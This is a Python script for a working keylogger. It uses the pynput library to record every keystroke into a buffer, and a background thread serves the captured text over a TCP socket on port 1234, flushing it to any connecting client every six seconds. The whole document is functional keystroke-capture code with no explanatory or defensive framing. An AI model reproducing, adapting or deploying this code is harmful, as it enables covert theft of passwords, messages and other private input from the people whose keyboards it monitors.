from threading import Thread, Lock
from time import sleep
import socket
from pynput.keyboard import Key, Listener

key_input = ""
key_input_lock = Lock()  # To ensure thread safety

def listen(key):
    global key_input
    try:
        with key_input_lock:
            if key == Key.space:
                key_input += " "
            elif key == Key.backspace:
                key_input = key_input[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                key_input += key.char
    except Exception:
        pass

def send():
    global key_input
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 1234)) 
    s.listen(3) 
    print("Server listening on 127.0.0.1:1234")
    
    while True:
        S_socket, S_address = s.accept()
        print(f"Connection from {S_address}")
        
        try:
            while True:
                with key_input_lock:
                    if key_input:
                        S_socket.send(bytes(key_input, "utf-8"))
                        key_input = ""
                sleep(6)
        except Exception as e:
            print(f"Error: {e}")
        finally:
            S_socket.close()

thread = Thread(target=send)
thread.start()

with Listener(on_press=listen) as key_listener:
    key_listener.join()
